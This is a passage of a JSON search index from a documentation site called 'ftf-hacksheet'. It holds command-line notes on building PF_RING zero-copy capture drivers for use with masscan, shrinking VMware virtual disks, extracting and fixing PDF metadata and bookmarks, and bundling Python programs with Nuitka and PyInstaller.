\\(started\\|done\\)\\)/d' cmd.html . | Use capture-website to generate the img:# Auto-crop full-page with --height=1 capture-website --height=1 --full-page --overwrite --output=cmd.png cmd.html # 'Unable to capture screenshot' means # that the height is above 10000000px # This is a Chrome limitation # Use --inset to workaround the issue capture-website --height=30000 --inset=20000,0,0,0 --overwrite cmd.html # ^ 10000 pixels from 20000y-px # TODO Join all the images for full-out # TODO Crop Script tags with --inset . | . ",
    "url": "http://localhost:4000/#tricky-configuration--screenshot-full-command-output",
    "relUrl": "/#tricky-configuration--screenshot-full-command-output"
  },"655": {
    "doc": "ftf-hacksheet",
    "title": "FFplay Scale Realtime Input",
    "content": ". | Assuming input signal of 1920x1080 and scaling to 3840x2160 (auto):vblank_mode=0 ffplay -video_size 1920x1080 -fast -an -infbuf -sync audio -framedrop -drp 0 -vf 'scale=3840:-1' -loglevel -8 -fs /dev/video1 . | . ",
    "url": "http://localhost:4000/#tricky-configuration--ffplay-scale-realtime-input",
    "relUrl": "/#tricky-configuration--ffplay-scale-realtime-input"
  },"656": {
    "doc": "ftf-hacksheet",
    "title": "NTop PF_RING (for Masscan)",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan-",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan-"
  },"657": {
    "doc": "ftf-hacksheet",
    "title": "Requirements",
    "content": ". | The Zero Copy drivers for the adapters only replace those that use PCIe (supported), so first check if your ethernet adapter uses PCI-express with lspci | grep -i ethernet, then check that the module currently used by the kernel is the same as the ones from the supported cards, ie, an Intel 8254x should be using e1000e: lsmod | grep e1000e | Note that e1000 and e1000e are not the same, make sure that the kernel is currently using e1000e (or can be instructed to use it) before proceeding | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---requirements",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---requirements"
  },"658": {
    "doc": "ftf-hacksheet",
    "title": "Pre-made packages",
    "content": ". | Some Debian distros have pkgs pre-made | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---pre-made-packages",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---pre-made-packages"
  },"659": {
    "doc": "ftf-hacksheet",
    "title": "Installing from source",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source"
  },"660": {
    "doc": "ftf-hacksheet",
    "title": "Kali Linux",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux"
  },"661": {
    "doc": "ftf-hacksheet",
    "title": "Dependencies:",
    "content": ". | linux-headers | dkms | dh-make | bison - Zero Copy | libjson-c-dev - Flow Table | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--dependencies-",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--dependencies-"
  },"662": {
    "doc": "ftf-hacksheet",
    "title": "Good to have",
    "content": ". | Debian package creator: checkinstall | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--good-to-have",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--good-to-have"
  },"663": {
    "doc": "ftf-hacksheet",
    "title": "Installation",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation"
  },"664": {
    "doc": "ftf-hacksheet",
    "title": "PF_RING Flow Table",
    "content": ". | Documentation | Clone the sources:git clone https://github.com/ntop/nDPI . | Install the library:cd nDPI ./autogen.sh # Add the version number checkinstall . | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-flow-table",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-flow-table"
  },"665": {
    "doc": "ftf-hacksheet",
    "title": "PF_RING Zero Copy",
    "content": ". | Documentation | Clone the sources:git clone https://github.com/ntop/PF_RING . | Install the kernel module:cd PF_RING/kernel ./configure make -f Makefile.dkms deb . | Install the ZC driver module:cd ../drivers/intel ./configure make -f Makefile.dkms.&lt;driver&gt; deb . | Install the libpfring library:cd ../userland/lib ./configure --enable-ndpi # Add the version number # and ndpi as dependency checkinstall . | Install the patched libpcap:cd ../libpcap # Add --with-{dag,septel,...} # if you have any of those cards ./configure # Add the version number # and libpfring as dependency checkinstall . | Install patched tcpdump:cd ../tcpdump ./configure # Add the version number # and libpfring as dependency checkinstall . | Install Wireshark plugins:cd ../wireshark/extcap # You make have to return to the # folders where dkms was used and # issue a make for this to work make # Enable select the PF_RING iface cp ntopdump /usr/lib/&lt;linux-platform&gt;/wireshark/extcap/ cd ../plugins # Enable the PF_RING proto filter cp PFRingFlow.lua /usr/lib/&lt;linux-platform&gt;/wireshark/plugins/ # Or ~/.local/lib/wireshark/plugins/ # Or ~/.wireshark/plugins/ . | Install specific card modules:cd ../../modules/&lt;card&gt; ./configure # Add the version number checkinstall . | Install tools and services:cd ../../../ # Command line tools cp package/usr/bin/* /usr/bin/ cp tools/n2if /usr/bin/ # Systemd services cp package/etc/systemd/system/* /etc/systemd/system/ . | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-zero-copy",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-zero-copy"
  },"666": {
    "doc": "ftf-hacksheet",
    "title": "Post-Installation Configuration",
    "content": ". | Enable Hugepages | Set the correct RSS values | Basic Configuration:# Folder skeleton mkdir -p /etc/pf_ring/zc/&lt;driver&gt; # Set Hugepages values echo \"node=0 hugepagenumber=1024\" &gt; /etc/pf_ring/hugepages.conf # Enable RSS echo \"RSS=0,0,0,0\" &gt; /etc/pf_ring/zc/&lt;driver&gt;/&lt;driver&gt;.conf # Make the driver usable touch /etc/pf_ring/zc/&lt;driver&gt;/&lt;driver&gt;.start # Set the type of usage per iface cat &gt; /etc/pf_ring/interfaces.conf &lt;&lt; EOF MANAGEMENT_INTERFACES=\"eth0\" CAPTURE_INTERFACES=\"eth1 eth2\" EOF # Or force to load the ZC driver touch /etc/pf_ring/forcestart # You may need to reset the iface echo \"ifconfig eth0 192.168.1.1\" &gt; /etc/pf_ring/post chmod +x /etc/pf_ring/post # Enable and start the service systemctl enable --now pf_ring # Check the driver in use pf_ringcfg --list-interfaces # Also check its Polling Mode: cat /proc/net/pf_ring/dev/eth0/info . | IDS Acceleration Example | . ",
    "url": "http://localhost:4000/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--post-installation-configuration",
    "relUrl": "/#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--post-installation-configuration"
  },"667": {
    "doc": "ftf-hacksheet",
    "title": "VMWare VM Maintenance",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--vmware-vm-maintenance",
    "relUrl": "/#tricky-configuration--vmware-vm-maintenance"
  },"668": {
    "doc": "ftf-hacksheet",
    "title": "Defrag",
    "content": ". | From inside the client machine:e4defrag / . | . ",
    "url": "http://localhost:4000/#tricky-configuration--vmware-vm-maintenance--defrag",
    "relUrl": "/#tricky-configuration--vmware-vm-maintenance--defrag"
  },"669": {
    "doc": "ftf-hacksheet",
    "title": "Shrink Disk",
    "content": ". | Repeat the following twice, starting and powering off the machine (and waiting 10 minutes) in between to allow the VMplayer disk allocator to do its magic | From inside the client machine:vmware-toolbox-cmd disk wipe / ; cat /dev/zero &gt; /wipefile; sync; rm /wipefile; sync ; vmware-toolbox-cmd disk shrinkonly / . | Power off the client | From the command line (ref):cd &lt;folder-with-vmdk&gt; ls # Defrag vmware-vdiskmanager -d &lt;main-vmdk&gt; # Shrink vmware-vdiskmanager -k &lt;main-vmdk&gt; . | Alternatively from the VMplayer UI: . | Select the Hard Drive of the client in the VMplayer dashboard &gt; VM Settings | Select Defrag disk (doesn&#8217;t seem to work) | Select Compact disk | . | . ",
    "url": "http://localhost:4000/#tricky-configuration--vmware-vm-maintenance--shrink-disk",
    "relUrl": "/#tricky-configuration--vmware-vm-maintenance--shrink-disk"
  },"670": {
    "doc": "ftf-hacksheet",
    "title": "Pip Cache",
    "content": ". | Purge pip cache and don&#8217;t use it anymore# Purge all cache pip cache purge # Don't use cache pip config set global.cache-dir false . | . ",
    "url": "http://localhost:4000/#tricky-configuration--pip-cache",
    "relUrl": "/#tricky-configuration--pip-cache"
  },"671": {
    "doc": "ftf-hacksheet",
    "title": "Metadata",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--metadata",
    "relUrl": "/#tricky-configuration--metadata"
  },"672": {
    "doc": "ftf-hacksheet",
    "title": "exiftool",
    "content": ". | Site - Read/Write metadata from filesexiftool &lt;file&gt; . | Extract interesting meta-fields from PDFs# TODO - Try to recover stripped metadata for f in *.pdf; do exiftool \"$f\" | awk -vf=\"\\n${f//\\\\/\\\\\\\\}\\n\" -vd=\"${f//?/-}\" 'BEGIN{print d f d}END{print\"\"}{s=$0;gsub(\"^[^:]+|[][,)( :.]\",\"\",s)}s&amp;&amp;/^(MSIP[^:]*)*(Author|Title|Keywords|Creator|Producer|Artist|Credit|Special|By[- ]?Line|(Copy)?[Rr]ights?|Source|For|Name|Owner|Instructions|Originating ?Program|Keywords|Subject|Headline|(Image ?)?Description|City|Country|Company|Comment|Create ?Date|Metadata ?Date|Modify ?Date|Set ?Date|PDF ?Version|GTS ?PDFX ?Version|AI ?Creator ?Version|History ?Parameters|(History ?)?Software ?Agent|Primary ?Platform|Device ?Manufacturer|XMP ?Toolkit|Slices ?Group ?Name|GPS|Make|Camera ?Model ?Name|(Writer|Reader) ?Name|Image ?Description|Sensitivity|Directory|Application|(Manifest ?Reference|Ingredients) ?File ?Path|Profile ?Copyright|Language|Encryption|User ?Access)/&amp;&amp;!x[s]++'; done | tee allpdfs.meta | less # Use pdftk to easily identify when a PDF # has Author Passwords instead of looking # at the Encryption &amp; User Access header # Mod to hide the headings if no metadata # for f in *.png *.jpg; do [...] | # awk [...] 'END{if(p)print\"\"}{s=$0[...] # }&amp;&amp;!x[s]++{if(!p++)print d f d;print}'; # done | [...] . | . ",
    "url": "http://localhost:4000/#tricky-configuration--metadata--exiftool",
    "relUrl": "/#tricky-configuration--metadata--exiftool"
  },"673": {
    "doc": "ftf-hacksheet",
    "title": "PDF",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--pdf",
    "relUrl": "/#tricky-configuration--pdf"
  },"674": {
    "doc": "ftf-hacksheet",
    "title": "Extract Text",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--extract-text",
    "relUrl": "/#tricky-configuration--pdf--extract-text"
  },"675": {
    "doc": "ftf-hacksheet",
    "title": "pdftotext (poppler)",
    "content": ". | Site - PDF rendering &amp; extractor# Extract to stdout pdftotext &lt;file.pdf&gt; - # By default &lt;file.txt&gt; is created # Include metadata: pdftotext -htmlmeta &lt;file.pdf&gt; - | sed -n 's/^&lt;meta .*/&amp;\\n/p;/^&lt;pre&gt;/,/^&lt;\\/pre&gt;/{//!p}' # Analyze all PDFs in current dir for f in *.pdf; do echo \"$f\" | sed \"h;s/./-/gp;H;x\"; pdftotext -htmlmeta \"$f\" - | sed -n 's/&lt;meta .*/&amp;\\n/p;/&lt;pre&gt;/,/&lt;\\/pre&gt;/{//!p}'; echo; done | less . | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--extract-text--pdftotext--poppler-",
    "relUrl": "/#tricky-configuration--pdf--extract-text--pdftotext--poppler-"
  },"676": {
    "doc": "ftf-hacksheet",
    "title": "TOC / Bookmarks",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks"
  },"677": {
    "doc": "ftf-hacksheet",
    "title": "Tabula",
    "content": ". | Site - PDF data extractor WebUI-based:# Start web server at 8080 tabula # Use a different port + options tabula 9090 &lt;tabula-opts&gt; . | Open the browser at localhost:&lt;port&gt; | Export as JSON (data) to use with jq | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--tabula",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--tabula"
  },"678": {
    "doc": "ftf-hacksheet",
    "title": "pdftk",
    "content": ". | Site - PDF data manipulator | Export Bookmarks + Metadata:pdftk &lt;file.pdf&gt; dump_data output &lt;meta-file&gt; . | Import Bookmarks + Metadata:pdftk &lt;file.pdf&gt; update_info &lt;meta-file&gt; output &lt;updated.pdf&gt; . | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--pdftk",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--pdftk"
  },"679": {
    "doc": "ftf-hacksheet",
    "title": "pdfminer",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--pdfminer",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--pdfminer"
  },"680": {
    "doc": "ftf-hacksheet",
    "title": "Information",
    "content": ". | Site - PDF data extractor/analyzer | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--pdfminer--information",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--pdfminer--information"
  },"681": {
    "doc": "ftf-hacksheet",
    "title": "dumppdf.py",
    "content": ". | Extract the internal PDF structure:# Only TOC/Bookmark table in xml dumppdf.py -T &lt;file.pdf&gt; -o TOC.xml . | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--pdfminer--dumppdf-py",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--pdfminer--dumppdf-py"
  },"682": {
    "doc": "ftf-hacksheet",
    "title": "Ghostscript",
    "content": ". | Site - PostScript + PDF interpreter:# Try compress PDF better gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/prepress -dNOPAUSE -dQUIET -dBATCH -sOutputFile=&lt;output.pdf&gt; &lt;input.pdf&gt; . | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--ghostscript",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--ghostscript"
  },"683": {
    "doc": "ftf-hacksheet",
    "title": "Import + Fix Bookmarks other PDF",
    "content": ". | Use when there are two similar PDFs: . | But only one with TOC/Bookmark table | Which wants to be added to the other | . | Extract metadata of both PDFs:pdftk &lt;file1.pdf&gt; dump_data output &lt;meta-file1&gt; pdftk &lt;file2.pdf&gt; dump_data output &lt;meta-file2&gt; . | Manually add the desired metadata from &lt;meta-file1&gt; to &lt;meta-file2&gt; . | All Bookmark* data, for example | . | Using tabula, select the TOC from the PDF pages without the leading section numbers: . | Do select &quot;Section1 34&quot; (page nº 34) | Don&#8217;t select &quot;1. Section1 34&quot; | . | Export as JSON (data), file &lt;file.json&gt; | Annotate the offset number to the first page in the TOC: . | If Section1 is in TOC page 1, but actual PDF page is 22, offset = 21 | . | Fix bookmark pages by using the TOC and offset:offset=21 jq -r '.. | .text?' &lt;file.json&gt; | sed '/^null$/{d;n};/[0-9]$/!{N;s/\\n//};s/\\(\\. \\.\\? \\?\\)\\+//' | while read l; do num=$(grep -o '[0-9]\\{1,3\\}$' &lt;&lt;&lt; \"$l\"); sec=${l%${num}}; sed -i \"/BookmarkTitle:.*${sec//\\//\\\\/}$/{n;n;s/[0-9]\\+$/$((num + $offset))/}\" &lt;meta-file2&gt;; done . | Fix subsections pages not showing in TOC (subsections with more than 2 levels) by calculating offset:# Not 100% reliable offsets grep -B 3 -A 1 'BookmarkLevel: [^12]$' &lt;meta-file1&gt; | awk '/^BookmarkPageNumber:/{if(bt!=\"\"){n=$2 - pn; print bt, n &lt; 0 ? n % 2 ? 0 : 1 : n; bt=\"\"};pn=$2} /^BookmarkTitle:/{$1=\"\";bt=substr($0,2)}' | while read l; do t=${l% [0-9]}; n=${l#${t} }; gawk -i inplace \"/^BookmarkPageNumber/{pn=\\$2} /^BookmarkTitle:.*${t//\\//\\\\/}$/{print; getline; print; getline; \\$2=pn + $n} {print}\" &lt;meta-file2&gt;; done . | Add new metadata to updated file2.pdf:pdftk &lt;file2.pdf&gt; update_info &lt;meta-file2&gt; output &lt;updated.pdf&gt; . | . ",
    "url": "http://localhost:4000/#tricky-configuration--pdf--toc---bookmarks--import---fix-bookmarks-other-pdf",
    "relUrl": "/#tricky-configuration--pdf--toc---bookmarks--import---fix-bookmarks-other-pdf"
  },"684": {
    "doc": "ftf-hacksheet",
    "title": "Compilers",
    "content": " ",
    "url": "http://localhost:4000/#compilers",
    "relUrl": "/#compilers"
  },"685": {
    "doc": "ftf-hacksheet",
    "title": "Python",
    "content": " ",
    "url": "http://localhost:4000/#compilers--python",
    "relUrl": "/#compilers--python"
  },"686": {
    "doc": "ftf-hacksheet",
    "title": "Notes",
    "content": ". | Try downloading the dependencies with pipenv or venv to avoid conflicts | . ",
    "url": "http://localhost:4000/#compilers--python--notes",
    "relUrl": "/#compilers--python--notes"
  },"687": {
    "doc": "ftf-hacksheet",
    "title": "Nuitka",
    "content": ". | Nuitka transforms the intermediary Python code to C and compiles it with a C compiler (which will download):# Using python -m is preferred to # simply calling nuitka # You may try these as a last resort: # --follow-stdlib # --force-dll-dependency-cache-update # # Note that follow-stdlib may require # including all modules in the .py # --include-module=site # # You may force include pkg/modules: # --include-plugin-directory= # # You may use a different compiler: # --mingw64 | --clang | --msvc=&lt;ver&gt; # # You may try linking optimizations: # --lto # # You may cross arch compile: # --python-arch= # # In Windows you may specify another # dir for extraction (like C:) with # --windows-onefile-tempdir-spec= # # In Windows you may force the stdout # and stderr to specific files with # --windows-force-stdout-spec= # --windows-force-stderr-spec= # &gt; Don't use UPX with nuitka EXEs python -m nuitka --output-dir=nuitka-build --assume-yes-for-downloads --follow-imports --standalone --onefile --remove-output --windows-onefile-tempdir --include-data-file=&lt;additional-dir&gt;/=&lt;additional-dir&gt;/ &lt;main-py-file&gt; . | . ",
    "url": "http://localhost:4000/#compilers--python--nuitka",
    "relUrl": "/#compilers--python--nuitka"
  },"688": {
    "doc": "ftf-hacksheet",
    "title": "PyInstaller",
    "content": ". | PyInstaller bundles the current python interpreter and the package into an executable:# Try using UPX: --upx-dir # Try without unicode: -a # Force import: --hidden-import &lt;pkg&gt; # Stricter: # --win-no-prefer-redirects # --win-private-assemblies python -m pyinstaller -c -F --clean &lt;main-py-file&gt; . | . ",
    "url": "http://localhost:4000/#compilers--python--pyinstaller",
    "relUrl": "/#compilers--python--pyinstaller"
  },"689": {
    "doc": "ftf-hacksheet",
    "title": "cx_Freeze",
    "content": ". | cx_Freeze is another alternative but requires Microsoft Visual C++/SDK to create the bundles | . ",
    "url": "http://localhost:4000/#compilers--python--cx_freeze",
    "relUrl": "/#compilers--python--cx_freeze"
  },"690": {
    "doc": "ftf-hacksheet",
    "title": "ftf-hacksheet",
    "content": " ",
    "url": "http://localhost:4000/",
    "relUrl": "/"
  }
}
